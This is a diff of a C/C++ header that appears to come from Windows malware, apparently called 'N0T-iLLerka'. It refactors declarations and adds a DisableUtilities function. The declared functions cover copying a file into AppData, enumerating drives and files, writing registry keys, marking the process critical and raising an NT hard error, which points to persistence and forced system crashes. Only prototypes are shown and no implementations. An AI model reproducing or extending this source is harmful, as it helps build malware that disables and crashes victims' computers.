@@ -19,7 +19,6 @@
 #define HOST_SEMAPHORE L"Global\\Win32S.N0T-iLLerka.X:Argv./host.Proc(running)"
 
 // Function Macros
-#define RandomNumberGenerator	RandomNumberGeneratorW
 #define RandomStringGenerator	RandomStringGeneratorW
 #define CreateRegistryKey		CreateRegistryKeyW
 #define CheckRegistryKey		CheckRegistryKeyW
@@ -40,28 +39,29 @@
 #pragma comment(lib, "bcrypt.lib")
 
 // Arrays
-extern const wchar_t CharSet[];
+extern const WCHAR CharSet[];
 extern const size_t nCharSet;
 
 // FileSystem Functions
-bool CopyFileAppDataW(LPCWSTR lpAdpn, LPCWSTR lpAdfn, wchar_t mfn[]);
-bool DriveEnumeratorW(std::vector<std::wstring>& vwsDrive);
-bool DirectoryIeteratorW(std::wstring wsDir, std::wstring wsMask, std::vector<std::wstring>& vwsDir, std::vector<std::wstring>& vwsFile);
+BOOL CopyFileAppDataW(LPCWSTR lpAdpn, LPCWSTR lpAdfn, WCHAR mfn[]);
+BOOL DriveEnumeratorW(std::vector<std::wstring>& vwsDrive);
+BOOL DirectoryIeteratorW(std::wstring wsDir, std::wstring wsMask, std::vector<std::wstring>& vwsDir, std::vector<std::wstring>& vwsFile);
 
 // Synchronization Functions
-bool CheckMutexW(LPCWSTR lpName);
-bool CheckSemaphoreW(LPCWSTR lpName);
+BOOL CheckMutexW(LPCWSTR lpName);
+BOOL CheckSemaphoreW(LPCWSTR lpName);
 
 // RegEdit Functions
-bool CreateRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, DWORD dwValue);
-bool CheckRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD edwType, BYTE ebValue);
+BOOL CreateRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, DWORD dwValue);
+BOOL CheckRegistryKeyW(LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD edwType, BYTE ebValue);
+BOOL DisableUtilities(VOID);
 
 // Utilitie Functions
-int RandomNumberGeneratorW();
-std::wstring RandomStringGeneratorW(int rsg_strlen);
-BOOL IsUserAdmin();
+INT RandomNumberGenerator(VOID);
+std::wstring RandomStringGeneratorW(INT rsg_strlen);
+BOOL IsUserAdmin(VOID);
 
 // NT Utilitie Functions
-bool NTImportDLLFUNC();
-bool NTSetProcessIsCritical(BOOLEAN blIscritical);
-bool NTRaiseHardError();
+BOOL ImportNTDLLFunctions(VOID);
+BOOL NTSetProcessIsCritical(BOOLEAN blIscritical);
+BOOL NTRaiseHardError(VOID);
